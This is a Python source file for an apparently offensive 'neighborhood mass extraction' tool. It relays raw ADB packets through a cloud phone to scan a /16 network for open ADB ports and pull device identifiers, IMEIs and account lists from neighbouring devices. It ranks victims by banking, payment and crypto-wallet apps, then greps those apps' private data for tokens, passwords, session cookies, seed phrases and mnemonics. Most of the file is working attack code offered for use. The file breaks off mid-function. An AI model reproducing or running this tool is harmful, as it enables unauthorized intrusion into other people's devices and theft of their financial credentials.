#!/usr/bin/env python3
"""
Neighborhood Mass Extraction Tool v2.0
========================================
One-shot tool: scan ALL neighbors on 10.0.0.0/16 → extract device identity
+ all running 3rd-party apps + app data → create per-device folders →
analyze extracted data locally.

Architecture (proven D1Bridge relay):
  VPS → VMOS Cloud API (sync_cmd/async_adb_cmd) → Our Device (AC320)
        → staged CNXN/OPEN ADB packets → nc pipe → Neighbor:5555

Uses the EXACT same ADB wire protocol relay method that worked for
neighbor_backup_restore.py (verified against 10.0.26.220 Pixel 9, etc).

Usage:
  python3 tools/neighborhood_extractor.py                    # Full pipeline
  python3 tools/neighborhood_extractor.py scan               # Scan only
  python3 tools/neighborhood_extractor.py extract            # Extract identities
  python3 tools/neighborhood_extractor.py analyze            # Analyze existing
  python3 tools/neighborhood_extractor.py test [N]           # Test on N devices (default 10)
  python3 tools/neighborhood_extractor.py extract-one <IP>   # Single device
"""

import asyncio
import base64
import json
import os
import struct
import sys
import time
import re
from datetime import datetime
from pathlib import Path
from collections import defaultdict

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient

# ═══════════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════════

AK = "YOUR_VMOS_AK_HERE"
SK = "YOUR_VMOS_SK_HERE"
PAD = "AC32010810392"
BASE_URL = "https://api.vmoscloud.com"
OUR_IP = "10.0.21.62"

# Rate limiting
CMD_DELAY = 3.5

# Output paths
BASE_DIR = Path(__file__).resolve().parent.parent
EXTRACTION_DIR = BASE_DIR / "extractions"
SCAN_RESULTS_FILE = EXTRACTION_DIR / "scan_results.json"
HOSTS_FILE = BASE_DIR / "tmp" / "fullscan_hosts.txt"
HARVEST_SCAN = BASE_DIR / "tmp" / "harvest_scan.json"

# High-value package scoring
HIGH_VALUE_PKGS = {
    "com.google.android.apps.walletnfcrel": ("Google Wallet/Pay", 15),
    "com.paypal.android.p2pmobile": ("PayPal", 12),
    "com.venmo": ("Venmo", 12),
    "com.squareup.cash": ("Cash App", 12),
    "com.revolut.revolut": ("Revolut", 12),
    "com.samsung.android.spay": ("Samsung Pay", 10),
    "com.zellepay.zelle": ("Zelle", 10),
    "com.klarna.android": ("Klarna", 8),
    "io.metamask": ("MetaMask", 20),
    "com.wallet.crypto.trustapp": ("Trust Wallet", 20),
    "app.phantom": ("Phantom Wallet", 20),
    "com.coinbase.android": ("Coinbase", 15),
    "com.binance.dev": ("Binance", 15),
    "com.robinhood.android": ("Robinhood", 12),
    "com.krakenfx.app": ("Kraken", 12),
    "piuk.blockchain.android": ("Blockchain.com", 12),
    "com.crypto.exchange": ("Crypto.com", 12),
    "com.bybit.app": ("Bybit", 10),
    "com.okex.app": ("OKX", 10),
    "com.chase.sig.android": ("Chase", 12),
    "com.wf.wellsfargo": ("Wells Fargo", 12),
    "com.bankofamerica.cashpro": ("BofA", 12),
    "com.capitalone.mobile": ("Capital One", 10),
    "com.sofi.mobile": ("SoFi", 10),
    "com.chime.android": ("Chime", 10),
    "co.mona.android": ("Monzo", 10),
    "com.starlingbank.android": ("Starling", 10),
    "com.n26.app": ("N26", 10),
    "com.transferwise.android": ("Wise", 10),
    "com.whatsapp": ("WhatsApp", 8),
    "org.telegram.messenger": ("Telegram", 8),
    "com.discord": ("Discord", 5),
    "com.instagram.android": ("Instagram", 5),
    "com.twitter.android": ("Twitter/X", 5),
    "com.facebook.katana": ("Facebook", 5),
}

SYSTEM_PREFIXES = [
    "com.android.", "com.google.android.", "android.", "com.cloud.",
    "com.owlproxy.", "com.vmos.", "com.mediatek.", "com.qualcomm.",
]

FINTECH_KEYWORDS = [
    "pay", "wallet", "bank", "cash", "crypto", "coin", "trade", "exchange",
    "finance", "money", "transfer", "remit", "lending", "credit", "loan",
    "invest", "stock", "btc", "eth", "nft", "defi", "token",
]


# ═══════════════════════════════════════════════════════════════════════
# ADB WIRE PROTOCOL (from proven neighbor_backup_restore.py)
# ═══════════════════════════════════════════════════════════════════════

ADB_CNXN = b"CNXN"
ADB_OPEN = b"OPEN"
ADB_WRTE = b"WRTE"
ADB_CLSE = b"CLSE"
ADB_OKAY = b"OKAY"
ADB_VERSION = 0x01000001
ADB_MAXDATA = 256 * 1024


def _adb_checksum(data: bytes) -> int:
    return sum(data) & 0xFFFFFFFF

def _adb_magic(cmd: bytes) -> int:
    return struct.unpack("<I", cmd)[0] ^ 0xFFFFFFFF

def _build_adb_packet(cmd: bytes, arg0: int, arg1: int, data: bytes = b"") -> bytes:
    header = struct.pack("<4sIIIII",
                         cmd, arg0, arg1,
                         len(data), _adb_checksum(data),
                         _adb_magic(cmd))
    return header + data

def build_adb_cnxn() -> bytes:
    banner = b"host::\x00"
    return _build_adb_packet(ADB_CNXN, ADB_VERSION, ADB_MAXDATA, banner)

def build_adb_open(local_id: int, service: str) -> bytes:
    return _build_adb_packet(ADB_OPEN, local_id, 0, service.encode() + b"\x00")

def parse_adb_packets(raw: bytes) -> list:
    packets = []
    pos = 0
    while pos + 24 <= len(raw):
        cmd = raw[pos:pos + 4]
        if cmd not in (ADB_CNXN, ADB_OPEN, ADB_OKAY, ADB_WRTE, ADB_CLSE):
            pos += 1
            continue
        arg0, arg1, length, checksum, magic = struct.unpack_from("<IIIII", raw, pos + 4)
        data_end = pos + 24 + length
        if data_end > len(raw):
            data = raw[pos + 24:]
            packets.append({"cmd": cmd, "arg0": arg0, "arg1": arg1, "data": data})
            break
        data = raw[pos + 24:data_end]
        packets.append({"cmd": cmd, "arg0": arg0, "arg1": arg1, "data": data})
        pos = data_end
    return packets


# ═══════════════════════════════════════════════════════════════════════
# BRIDGE: Proven ADB relay via staged packets + nc
# ═══════════════════════════════════════════════════════════════════════

class CloudBridge:
    """Execute commands via VMOS Cloud API with ADB relay to neighbors.
    
    Uses the EXACT proven method from neighbor_backup_restore.py:
    1. Stage binary CNXN packet as file on device (cached per IP)
    2. Stage binary OPEN packet for each command
    3. Pipe (CNXN; sleep 0.3; OPEN; sleep N) | nc IP 5555 > response_file
    4. Read response file, parse ADB WRTE packets, extract output
    """

    def __init__(self):
        self.client = VMOSCloudClient(ak=AK, sk=SK, base_url=BASE_URL)
        self._last_cmd = 0.0
        self._cmd_count = 0
        self._cnxn_staged = {}

    async def _throttle(self):
        elapsed = time.time() - self._last_cmd
        if elapsed < CMD_DELAY:
            await asyncio.sleep(CMD_DELAY - elapsed)

    async def cmd(self, command: str, timeout: int = 30) -> str:
        """Execute shell on our device, return stdout."""
        await self._throttle()
        self._last_cmd = time.time()
        self._cmd_count += 1
        try:
            r = await asyncio.wait_for(
                self.client.sync_cmd(PAD, command, timeout_sec=timeout),
                timeout=timeout + 15,
            )
            data = r.get("data", [])
            if isinstance(data, list) and data:
                return (data[0].get("errorMsg", "") or "").strip()
            elif isinstance(data, dict):
                return (data.get("errorMsg", "") or "").strip()
            return ""
        except asyncio.TimeoutError:
            return "ERR:api_timeout"
        except Exception as e:
            return f"ERR:{e}"

    async def fire(self, command: str):
        """Fire async command via async_adb_cmd (no output wait)."""
        await self._throttle()
        self._last_cmd = time.time()
        self._cmd_count += 1
        try:
            await self.client.async_adb_cmd([PAD], command)
        except Exception:
            pass

    async def _ensure_cnxn(self, ip: str):
        """Stage CNXN packet file on device (cached per IP)."""
        key = ip.replace(".", "_")
        if key not in self._cnxn_staged:
            b64 = base64.b64encode(build_adb_cnxn()).decode()
            await self.cmd(f"echo -n '{b64}' | base64 -d > /sdcard/.cnxn_{key}")
            self._cnxn_staged[key] = True

    async def neighbor_cmd(self, ip: str, shell_cmd: str, timeout: int = 8) -> str:
        """Execute shell command on neighbor via proven ADB relay.
        
        Uses ADB wire protocol relay (staged CNXN/OPEN → nc pipe → response file).
        Response is parsed on-device using 'strings' and read in chunks to work
        around the sync_cmd 2000-byte output limit.
        
        ~6-10 API calls per neighbor command depending on output size.
        """
        ip_key = ip.replace(".", "_")
        tag = f"{hash(shell_cmd) & 0xFFFF:04x}"

        # Stage CNXN (cached, usually 0 API calls)
        await self._ensure_cnxn(ip)

        # Stage OPEN packet
        open_pkt = build_adb_open(1, f"shell:{shell_cmd}")
        b64_open = base64.b64encode(open_pkt).decode()
        await self.cmd(f"echo -n '{b64_open}' | base64 -d > /sdcard/.o{tag}")

        # Fire relay via async_adb_cmd
        relay_cmd = (
            f"(cat /sdcard/.cnxn_{ip_key}; sleep 0.3; cat /sdcard/.o{tag}; sleep {timeout}) | "
            f"timeout {timeout + 2} nc {ip} 5555 > /sdcard/.r{tag} 2>/dev/null"
        )
        await self.fire(relay_cmd)

        # Wait for relay + command execution
        await asyncio.sleep(timeout + 4)

        # Parse response on-device: extract text from binary ADB response
        # using 'strings' + filter ADB protocol artifacts (CNXN/OKAY/WRTE/CLSE headers
        # and their partial merges with adjacent binary bytes)
        # Works around sync_cmd 2000-byte output limit
        info = await self.cmd(
            f"strings -n 3 /sdcard/.r{tag} | "
            f"grep -v -E '^(CNXN|OKAY|WRTE|CLSE|OPEN)' | "
            f"grep -v -e '^host::' -e '^device::' "
            f"> /sdcard/.t{tag} 2>/dev/null; "
            f"echo TOTAL:$(wc -l < /sdcard/.t{tag} 2>/dev/null)"
        )

        total_lines = 0
        for line in (info or "").split("\n"):
            if line.startswith("TOTAL:"):
                try:
                    total_lines = int(line.split(":")[1].strip())
                except (ValueError, IndexError):
                    pass

        if total_lines == 0:
            await self.cmd(f"rm -f /sdcard/.o{tag} /sdcard/.r{tag} /sdcard/.t{tag}")
            return ""

        # Read text in chunks of 30 lines (~1500 bytes per chunk, fits in 2000-byte sync_cmd limit)
        CHUNK = 30
        chunks = []
        for start in range(0, total_lines, CHUNK):
            if start == 0:
                chunk = await self.cmd(f"head -{CHUNK} /sdcard/.t{tag}")
            else:
                chunk = await self.cmd(
                    f"tail -n +{start + 1} /sdcard/.t{tag} | head -{CHUNK}"
                )
            if chunk:
                chunks.append(chunk)

        # Cleanup staged files
        await self.cmd(f"rm -f /sdcard/.o{tag} /sdcard/.r{tag} /sdcard/.t{tag}")

        return "\n".join(chunks).strip()

    @property
    def api_calls(self) -> int:
        return self._cmd_count


# ═══════════════════════════════════════════════════════════════════════
# PHASE 1: FAST NETWORK SCAN
# ═══════════════════════════════════════════════════════════════════════

async def phase1_scan(bridge: CloudBridge, force_rescan: bool = False) -> list[str]:
    """Fast /16 scan using on-device background script."""
    print("\n" + "=" * 70)
    print("PHASE 1: NETWORK SCAN (10.0.0.0/16)")
    print("=" * 70)

    if not force_rescan and HOSTS_FILE.exists():
        with open(HOSTS_FILE) as f:
            hosts = [l.strip() for l in f if l.strip() and re.match(r'^\d+\.\d+\.\d+\.\d+$', l.strip())]
        hosts = [h for h in hosts if h != OUR_IP]
        if hosts:
            print(f"  Using cached hosts file: {len(hosts)} hosts")
            return hosts

    if not force_rescan and SCAN_RESULTS_FILE.exists():
        with open(SCAN_RESULTS_FILE) as f:
            data = json.load(f)
        hosts = data.get("hosts", [])
        if hosts:
            age_hrs = (time.time() - data.get("timestamp", 0)) / 3600
            print(f"  Using cached scan: {len(hosts)} hosts ({age_hrs:.1f}h old)")
            if age_hrs < 48:
                return hosts

    print("  Deploying scan script to device...")
    scan_script = (
        "#!/system/bin/sh\n"
        "RESULT=/data/local/tmp/mass_scan_results.txt\n"
        "> $RESULT\n"
        "for SUBNET in $(seq 1 200); do\n"
        "  (for HOST in $(seq 1 254); do\n"
        "    IP=\"10.0.${SUBNET}.${HOST}\"\n"
        "    nc -z -w 1 $IP 5555 2>/dev/null && echo \"$IP\" >> $RESULT\n"
        "  done) &\n"
        "  if [ $((SUBNET % 10)) -eq 0 ]; then wait; fi\n"
        "done\n"
        "wait\n"
        "echo SCAN_DONE >> $RESULT\n"
    )
    b64_script = base64.b64encode(scan_script.encode()).decode()
    await bridge.cmd(
        f"echo '{b64_script}' | base64 -d > /data/local/tmp/mass_scan.sh && "
        f"chmod 755 /data/local/tmp/mass_scan.sh && echo DEPLOYED"
    )
    await bridge.cmd("rm -f /data/local/tmp/mass_scan_results.txt")
    await bridge.fire("nohup sh /data/local/tmp/mass_scan.sh > /dev/null 2>&1 &")

    print("  Scanning... (typically ~60-90s)")
    start = time.time()
    hosts = []
    for i in range(90):
        await asyncio.sleep(8)
        out = await bridge.cmd(
            "tail -5 /data/local/tmp/mass_scan_results.txt 2>/dev/null; "
            "wc -l < /data/local/tmp/mass_scan_results.txt 2>/dev/null"
        )
        if "SCAN_DONE" in (out or ""):
            all_hosts = await bridge.cmd(
                "grep -v SCAN_DONE /data/local/tmp/mass_scan_results.txt | sort -t. -k3,3n -k4,4n"
            )
            hosts = [h.strip() for h in (all_hosts or "").split("\n")
                     if h.strip() and re.match(r'^\d+\.\d+\.\d+\.\d+$', h.strip())]
            hosts = [h for h in hosts if h != OUR_IP]
            print(f"  ✓ Scan complete: {len(hosts)} neighbors in {time.time()-start:.0f}s")
            break
        if i % 4 == 0:
            lines = (out or "").strip().split("\n")
            cnt = lines[-1].strip() if lines else "0"
            print(f"  [{time.time()-start:.0f}s] {cnt} hosts...")
    else:
        all_hosts = await bridge.cmd(
            "grep -v SCAN_DONE /data/local/tmp/mass_scan_results.txt 2>/dev/null | sort -t. -k3,3n -k4,4n"
        )
        hosts = [h.strip() for h in (all_hosts or "").split("\n")
                 if h.strip() and re.match(r'^\d+\.\d+\.\d+\.\d+$', h.strip())]
        hosts = [h for h in hosts if h != OUR_IP]
        print(f"  ⚠ Timed out with {len(hosts)} hosts")

    EXTRACTION_DIR.mkdir(parents=True, exist_ok=True)
    with open(SCAN_RESULTS_FILE, "w") as f:
        json.dump({"timestamp": time.time(), "host_count": len(hosts), "hosts": hosts}, f, indent=2)
    return hosts


# ═══════════════════════════════════════════════════════════════════════
# PHASE 2: DEVICE IDENTITY + APP EXTRACTION
# ═══════════════════════════════════════════════════════════════════════

async def extract_device(bridge: CloudBridge, ip: str) -> dict:
    """Extract identity + all packages from one neighbor via ADB relay."""
    compound = (
        "echo '===IDENTITY==='; "
        "echo MODEL:$(getprop ro.product.model); "
        "echo BRAND:$(getprop ro.product.brand); "
        "echo MANUF:$(getprop ro.product.manufacturer); "
        "echo SERIAL:$(getprop ro.serialno); "
        "echo IMEI:$(getprop persist.sys.cloud.imeinum); "
        "echo ANDROID:$(getprop ro.build.version.release); "
        "echo BUILDID:$(getprop ro.build.display.id); "
        "echo FP:$(getprop ro.build.fingerprint); "
        "echo '===SHELL==='; "
        "id | head -1; "
        "echo '===ALL_PKGS==='; "
        "pm list packages 2>/dev/null; "
        "echo '===THIRD_PARTY==='; "
        "pm list packages -3 2>/dev/null; "
        "echo '===RUNNING==='; "
        "ps -A 2>/dev/null | awk '{print $NF}' | grep '\\\\.' | sort -u; "
        "echo '===ACCOUNTS==='; "
        "dumpsys account 2>/dev/null | grep -E 'Account|name=' | head -20; "
        "echo '===END===';"
    )
    out = await bridge.neighbor_cmd(ip, compound, timeout=10)

    if not out or "===IDENTITY===" not in out:
        return {"ip": ip, "status": "unreachable", "error": (out or "no response")[:200]}

    sections = _parse_sections(out)

    props_raw = sections.get("IDENTITY", [])
    props_dict = {}
    for line in props_raw:
        if ":" in line:
            key, _, val = line.partition(":")
            props_dict[key.strip()] = val.strip()
    identity = {
        "model": props_dict.get("MODEL", ""),
        "brand": props_dict.get("BRAND", ""),
        "manufacturer": props_dict.get("MANUF", ""),
        "serial": props_dict.get("SERIAL", ""),
        "imei": props_dict.get("IMEI", ""),
        "android_version": props_dict.get("ANDROID", ""),
        "build_id": props_dict.get("BUILDID", ""),
        "fingerprint": props_dict.get("FP", ""),
    }

    shell_lines = sections.get("SHELL", [])
    shell_access = "root" if any("uid=0" in l for l in shell_lines) else "shell"

    all_pkgs = [p.replace("package:", "").strip() for p in sections.get("ALL_PKGS", []) if p.startswith("package:")]
    third_party = [p.replace("package:", "").strip() for p in sections.get("THIRD_PARTY", []) if p.startswith("package:")]
    running = sections.get("RUNNING", [])
    accounts = sections.get("ACCOUNTS", [])

    score = 0
    high_value_apps = []
    fintech_apps = []
    for pkg in third_party:
        if pkg in HIGH_VALUE_PKGS:
            name, pts = HIGH_VALUE_PKGS[pkg]
            score += pts
            high_value_apps.append({"package": pkg, "name": name, "score": pts})
        elif any(kw in pkg.lower() for kw in FINTECH_KEYWORDS):
            score += 3
            fintech_apps.append(pkg)

    return {
        "ip": ip,
        "status": "alive",
        "identity": identity,
        "shell": shell_access,
        "all_packages": all_pkgs,
        "all_package_count": len(all_pkgs),
        "third_party": third_party,
        "third_party_count": len(third_party),
        "running_processes": running,
        "accounts": accounts,
        "score": score,
        "high_value_apps": high_value_apps,
        "fintech_apps": fintech_apps,
        "extracted_at": datetime.now().isoformat(),
    }


def _parse_sections(text: str) -> dict:
    """Parse ===SECTION=== delimited output into dict."""
    sections = {}
    current = None
    lines_buf = []
    for line in text.split("\n"):
        line = line.strip()
        if line.startswith("===") and line.endswith("==="):
            if current:
                sections[current] = lines_buf
            current = line.strip("=")
            lines_buf = []
        elif current and line:
            lines_buf.append(line)
    if current:
        sections[current] = lines_buf
    return sections


async def phase2_extract(bridge: CloudBridge, hosts: list[str], limit: int = 0) -> list[dict]:
    """Extract identity + packages from all hosts."""
    print("\n" + "=" * 70)
    target_hosts = hosts[:limit] if limit > 0 else hosts
    print(f"PHASE 2: IDENTITY EXTRACTION ({len(target_hosts)} hosts)")
    print("=" * 70)

    progress_file = EXTRACTION_DIR / "identity_progress.json"
    extracted = {}
    if progress_file.exists():
        with open(progress_file) as f:
            saved = json.load(f)
        extracted = {d["ip"]: d for d in saved.get("devices", []) if d.get("ip")}
        print(f"  Resuming: {len(extracted)} already done")

    remaining = [h for h in target_hosts if h not in extracted]
    if not remaining:
        print("  All hosts already extracted")
        return list(extracted.values())

    print(f"  Remaining: {len(remaining)} — ~{len(remaining)*20/60:.0f}min est")
    total = len(target_hosts)
    start = time.time()
    errors = 0

    for i, ip in enumerate(remaining):
        try:
            device = await extract_device(bridge, ip)
            extracted[ip] = device
            if device.get("status") == "alive":
                ident = device.get("identity", {})
                model = ident.get("model", "?")
                n_all = device.get("all_package_count", 0)
                n_tp = device.get("third_party_count", 0)
                sc = device.get("score", 0)
                score_str = f" ★{sc}" if sc > 0 else ""
                print(f"  [{len(extracted)}/{total}] {ip} → {model} ({n_all} all/{n_tp} 3p){score_str}")
            else:
                errors += 1
                if errors <= 5 or errors % 20 == 0:
                    print(f"  [{len(extracted)}/{total}] {ip} → unreachable")
        except Exception as e:
            errors += 1
            extracted[ip] = {"ip": ip, "status": "error", "error": str(e)[:200]}

        if len(extracted) % 10 == 0:
            _save_progress(extracted, progress_file)

    _save_progress(extracted, progress_file)
    elapsed = time.time() - start
    alive = [d for d in extracted.values() if d.get("status") == "alive"]
    scored = [d for d in alive if d.get("score", 0) > 0]
    print(f"\n  ✓ Phase 2: {len(alive)} alive, {len(scored)} high-value, {errors} errors in {elapsed/60:.1f}min")
    return list(extracted.values())


def _save_progress(extracted: dict, filepath: Path):
    filepath.parent.mkdir(parents=True, exist_ok=True)
    with open(filepath, "w") as f:
        json.dump({"timestamp": time.time(), "device_count": len(extracted),
                    "devices": list(extracted.values())}, f, indent=2)


# ═══════════════════════════════════════════════════════════════════════
# PHASE 3: DEEP APP DATA EXTRACTION
# ═══════════════════════════════════════════════════════════════════════

async def extract_app_data(bridge: CloudBridge, ip: str, package: str, device_dir: Path) -> dict:
    """Extract app data from neighbor: shared_prefs, databases, files."""
    pkg_dir = device_dir / package
    pkg_dir.mkdir(parents=True, exist_ok=True)

    compound = (
        f"echo '===PREFS==='; "
        f"ls /data/data/{package}/shared_prefs/ 2>/dev/null; "
        f"echo '===PREFS_SENSITIVE==='; "
        f"for f in /data/data/{package}/shared_prefs/*.xml; do "
        f"  echo FILE:$f; "
        f"  grep -iE 'token|key|secret|password|session|auth|cookie|access|refresh|jwt|bearer|credential|account|email|phone|wallet|address|seed|mnemonic|private' $f 2>/dev/null | head -20; "
        f"done; "
        f"echo '===DBS==='; "
        f"ls /data/data/{package}/databases/ 2>/dev/null; "
        f"echo '===FILES==='; "
        f"find /data/data/{package}/files/ -type f 2>/dev/null | head -30; "
        f"echo '===KEYSTORE==='; "
        f"ls /data/data/{package}/.keystore/ /data/data/{package}/no_backup/ 2>/dev/null; "
        f"echo '===END===';"
    )
    out = await bridge.neighbor_cmd(ip, compound, timeout=12)

    if not out or "===PREFS===" not in out:
        return {"package": package, "status": "failed", "error": (out or "")[:200]}

    sections = _parse_sections(out)
    result = {
        "package": package,
        "status": "extracted",
        "shared_prefs": sections.get("PREFS", []),
        "sensitive_data": sections.get("PREFS_SENSITIVE", []),
        "databases": sections.get("DBS", []),
        "files": sections.get("FILES", []),
        "keystore": sections.get("KEYSTORE", []),
    }

    with open(pkg_dir / "extraction.json", "w") as f:
        json.dump(result, f, indent=2)

    sensitive = sections.get("PREFS_SENSITIVE", [])
    if sensitive:
        with open(pkg_dir / "sensitive_prefs.txt", "w") as f:
            f.write("\n".join(sensitive))
    return result


async def phase3_deep_extract(bridge: CloudBridge, devices: list[dict], top_n: int = 50) -> dict:
    """Deep extract from top-N high-value devices."""
    print("\n" + "=" * 70)
    print("PHASE 3: DEEP APP DATA EXTRACTION")
    print("=" * 70)

    alive = [d for d in devices if d.get("status") == "alive" and d.get("score", 0) > 0]
    alive.sort(key=lambda d: d.get("score", 0), reverse=True)
    targets = alive[:top_n]

    if not targets:
        print("  No high-value targets")
        return {"status": "no_targets"}

    print(f"  Top {len(targets)} targets (score ≥ {targets[-1].get('score', 0)})")
    total_apps = extracted_apps = 0
    start = time.time()

    for i, device in enumerate(targets):
        ip = device["ip"]
        model = device.get("identity", {}).get("model", "unknown")
        hv_apps = device.get("high_value_apps", [])
        safe_ip = ip.replace(".", "_")
        safe_model = re.sub(r'[^\w\-]', '_', model)[:30]
        device_dir = EXTRACTION_DIR / "devices" / f"{safe_ip}_{safe_model}"
        device_dir.mkdir(parents=True, exist_ok=True)
        with open(device_dir / "identity.json", "w") as f:
            json.dump(device, f, indent=2)

        print(f"\n  [{i+1}/{len(targets)}] {ip} ({model}) ★{device.get('score',0)}, {len(hv_apps)} apps")
        for app_info in hv_apps:
            pkg = app_info["package"]
            total_apps += 1
            try:
                result = await extract_app_data(bridge, ip, pkg, device_dir)
                if result.get("status") == "extracted":
                    extracted_apps += 1
                    n_sens = len(result.get("sensitive_data", []))
                    n_dbs = len(result.get("databases", []))
                    print(f"    ✓ {app_info['name']}: {n_sens} sensitive, {n_dbs} dbs")
                else:
                    print(f"    ✗ {app_info['name']}: {result.get('status')}")
            except Exception as e:
                print(f"    ✗ {app_info['name']}: {e}")

    elapsed = time.time() - start
    print(f"\n  ✓ Phase 3: {extracted_apps}/{total_apps} apps, {len(targets)} devices, {elapsed/60:.1f}min")
    return {"devices": len(targets), "apps_attempted": total_apps, "apps_extracted": extracted_apps}


# ═══════════════════════════════════════════════════════════════════════
# PHASE 4: ANALYSIS
# ═══════════════════════════════════════════════════════════════════════

def phase4_analyze(devices: list[dict]) -> dict:
    """Analyze extracted data, generate reports."""
    print("\n" + "=" * 70)
    print("PHASE 4: ANALYSIS")
    print("=" * 70)

    alive = [d for d in devices if d.get("status") == "alive"]
    brands = defaultdict(int)
    models = defaultdict(int)
    android_versions = defaultdict(int)
    all_packages = defaultdict(int)
    third_party_packages = defaultdict(int)
    high_value_devices = []

    for d in alive:
        ident = d.get("identity", {})
        brands[ident.get("brand", "unknown")] += 1
        models[ident.get("model", "unknown")] += 1
        android_versions[ident.get("android_version", "unknown")] += 1
        for pkg in d.get("all_packages", []):
            all_packages[pkg] += 1
        for pkg in d.get("third_party", []):
            third_party_packages[pkg] += 1
        if d.get("score", 0) > 0:
            high_value_devices.append({
                "ip": d["ip"], "model": ident.get("model", "?"),
                "brand": ident.get("brand", "?"), "score": d.get("score", 0),
                "all_pkgs": d.get("all_package_count", 0),
                "third_party_pkgs": d.get("third_party_count", 0),
                "high_value_apps": [a["name"] for a in d.get("high_value_apps", [])],
            })

    high_value_devices.sort(key=lambda x: x["score"], reverse=True)
    hv_presence = {}
    for pkg, (name, pts) in HIGH_VALUE_PKGS.items():
        count = third_party_packages.get(pkg, 0)
        if count > 0:
            hv_presence[name] = {"package": pkg, "count": count, "score": pts}

    report = {
        "summary": {
            "total_scanned": len(devices), "alive": len(alive),
            "unreachable": len(devices) - len(alive),
            "high_value_count": len(high_value_devices),
            "unique_all_packages": len(all_packages),
            "unique_third_party": len(third_party_packages),
            "analysis_date": datetime.now().isoformat(),
        },
        "brands": dict(sorted(brands.items(), key=lambda x: x[1], reverse=True)),
        "models_top20": dict(sorted(models.items(), key=lambda x: x[1], reverse=True)[:20]),
        "android_versions": dict(sorted(android_versions.items(), key=lambda x: x[1], reverse=True)),
        "top_all_packages": dict(sorted(all_packages.items(), key=lambda x: x[1], reverse=True)[:50]),
        "top_third_party": dict(sorted(third_party_packages.items(), key=lambda x: x[1], reverse=True)[:50]),
        "high_value_app_presence": dict(sorted(hv_presence.items(), key=lambda x: x[1]["count"], reverse=True)),
        "high_value_devices_top30": high_value_devices[:30],
    }

    EXTRACTION_DIR.mkdir(parents=True, exist_ok=True)
    with open(EXTRACTION_DIR / "analysis_report.json", "w") as f:
        json.dump(report, f, indent=2)
    _save_text_report(report, EXTRACTION_DIR / "analysis_report.txt")

    print(f"\n  Alive:              {len(alive)}")
    print(f"  Unique pkgs (all):  {len(all_packages)}")
    print(f"  Unique 3rd-party:   {len(third_party_packages)}")
    print(f"  High-value devices: {len(high_value_devices)}")
    if high_value_devices:
        print(f"\n  Top 10:")
        for i, d in enumerate(high_value_devices[:10]):
            apps = ", ".join(d["high_value_apps"][:3])
            print(f"    {i+1}. {d['ip']} ({d['model']}) ★{d['score']} — {apps}")
    if hv_presence:
        print(f"\n  App Presence:")
        for name, info in sorted(hv_presence.items(), key=lambda x: x[1]["count"], reverse=True)[:15]:
            print(f"    {name}: {info['count']} devices")
    print(f"\n  Reports: {EXTRACTION_DIR}")
    return report


def _save_text_report(report: dict, filepath: Path):
    s = report.get("summary", {})
    lines = [
        "=" * 70, "NEIGHBORHOOD EXTRACTION ANALYSIS REPORT",
        f"Generated: {s.get('analysis_date', '')}", "=" * 70, "",
        "SUMMARY", "-" * 40,
        f"  Scanned:           {s.get('total_scanned', 0)}",
        f"  Alive:             {s.get('alive', 0)}",
        f"  Unreachable:       {s.get('unreachable', 0)}",
        f"  High-value:        {s.get('high_value_count', 0)}",
        f"  Unique pkgs (all): {s.get('unique_all_packages', 0)}",
        f"  Unique 3rd-party:  {s.get('unique_third_party', 0)}",
        "", "BRANDS", "-" * 40,
    ]
    for b, c in report.get("brands", {}).items():
        lines.append(f"  {b}: {c}")
    lines += ["", "ANDROID VERSIONS", "-" * 40]
    for v, c in report.get("android_versions", {}).items():
        lines.append(f"  Android {v}: {c}")
    lines += ["", "HIGH-VALUE APP PRESENCE", "-" * 40]
    for name, info in report.get("high_value_app_presence", {}).items():
        lines.append(f"  {name} ({info['package']}): {info['count']} devices")
    lines += ["", "TOP 30 HIGH-VALUE DEVICES", "-" * 40]
    for i, d in enumerate(report.get("high_value_devices_top30", [])):
        apps = ", ".join(d["high_value_apps"][:5])
        lines.append(f"  {i+1}. {d['ip']} ({d['brand']} {d['model']}) ★{d['score']} — {apps}")
    lines += ["", "TOP 50 ALL PACKAGES", "-" * 40]
    for pkg, cnt in list(report.get("top_all_packages", {}).items())[:50]:
        hv = " ★" if pkg in HIGH_VALUE_PKGS else ""
        lines.append(f"  {pkg}: {cnt}{hv}")
    lines += ["", "TOP 50 THIRD-PARTY", "-" * 40]
    for pkg, cnt in list(report.get("top_third_party", {}).items())[:50]:
        hv = " ★" if pkg in HIGH_VALUE_PKGS else ""
        lines.append(f"  {pkg}: {cnt}{hv}")
    with open(filepath, "w") as f:
        f.write("\n".join(lines) + "\n")


# ═══════════════════════════════════════════════════════════════════════
# TEST MODE
# ═══════════════════════════════════════════════════════════════════════

async def test_mode(n: int = 10):
    """Test extraction on N devices using known-alive hosts."""
    print("╔" + "═" * 68 + "╗")
    print(f"║  EXTRACTION TEST — {n} DEVICES                                      ║")
    print("╚" + "═" * 68 + "╝")

    EXTRACTION_DIR.mkdir(parents=True, exist_ok=True)
    bridge = CloudBridge()

    test_hosts = []
    if HARVEST_SCAN.exists():
        with open(HARVEST_SCAN) as f:
            scan_data = json.load(f)
        alive = [d for d in scan_data if isinstance(d, dict) and d.get("status") == "scanned"]
        alive.sort(key=lambda d: d.get("score", 0), reverse=True)
        test_hosts = [d["ip"] for d in alive[:n]]
        print(f"  Using {len(test_hosts)} hosts from previous harvest scan")
    elif HOSTS_FILE.exists():
        with open(HOSTS_FILE) as f:
            test_hosts = [l.strip() for l in f if l.strip()][:n]
        print(f"  Using first {len(test_hosts)} hosts from fullscan_hosts.txt")

    if not test_hosts:
        print("  No hosts available. Run 'scan' first.")
        return

    print(f"  Targets: {', '.join(test_hosts)}")
    start = time.time()
    results = []

    for i, ip in enumerate(test_hosts):
        print(f"\n--- Device {i+1}/{len(test_hosts)}: {ip} ---")
        try:
            device = await extract_device(bridge, ip)
            results.append(device)
            if device.get("status") == "alive":
                ident = device.get("identity", {})
                print(f"  Model:     {ident.get('model', '?')}")
                print(f"  Brand:     {ident.get('brand', '?')}")
                print(f"  Android:   {ident.get('android_version', '?')}")
                print(f"  Shell:     {device.get('shell', '?')}")
                print(f"  All pkgs:  {device.get('all_package_count', 0)}")
                print(f"  3rd-party: {device.get('third_party_count', 0)}")
                print(f"  Score:     {device.get('score', 0)}")
                for a in device.get("high_value_apps", []):
                    print(f"    ★ {a['name']} ({a['package']})")
                print(f"  Running:   {len(device.get('running_processes', []))} processes")
            else:
